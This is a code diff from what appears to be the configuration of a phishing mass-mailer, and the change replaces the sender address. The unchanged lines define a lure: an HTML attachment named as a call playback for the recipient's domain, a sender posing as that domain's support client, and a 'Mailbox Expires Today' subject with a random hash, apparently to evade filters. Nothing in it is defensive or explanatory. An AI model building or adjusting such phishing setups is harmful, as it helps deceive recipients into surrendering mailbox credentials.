@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['jimmy@jproj.se'];
+const senderAddresses = ['MS_eztaiQ@itrebians.org'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "Service client (SupportClient{RECIPIENT_DOMAIN_NAME})"; 
 const subjectLineWithPlaceholders = "Reminder: Mailbox Expires Today | RE: [{RANDOM_MD5}]";
